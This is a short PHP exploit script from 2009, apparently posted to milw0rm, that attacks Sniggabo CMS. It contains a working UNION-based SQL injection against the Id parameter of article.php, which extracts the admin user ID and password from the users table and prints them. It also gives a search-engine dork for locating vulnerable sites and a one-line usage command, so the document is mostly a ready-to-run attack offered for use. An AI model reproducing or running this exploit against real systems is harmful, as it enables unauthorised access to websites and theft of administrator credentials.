<?php
print_r('

################################################

Sniggabo CMS - Remote SQL Injection Exploit

Date:				11.06.2009
Vulnerability discovered by:	Lidloses_Auge
Exploit coded by:		Lidloses_Auge
Homepage:		    	http://www.novusec.com
Greetz to:			-=Player=- , Suicide, enco,
				Palme, GPM, karamble, Free-Hack

Admin Panel: 			[target]/admin/login.php
Dork:				"powered by Sniggabo CMS" inurl:article.php?id
Use:				php '.$argv[0].' http://www.site.com

################################################

');
$url = "$argv[1]/article.php?Id=null+union+select+concat(0x313a3a,userid,0x3a3a,password,0x3a3a)+from+users--";
$src = file_get_contents($url);
$data = split("::",$src);
echo "Admin: $data[1]\nPassword: $data[2]\n";
?>

# milw0rm.com [2009-06-11]
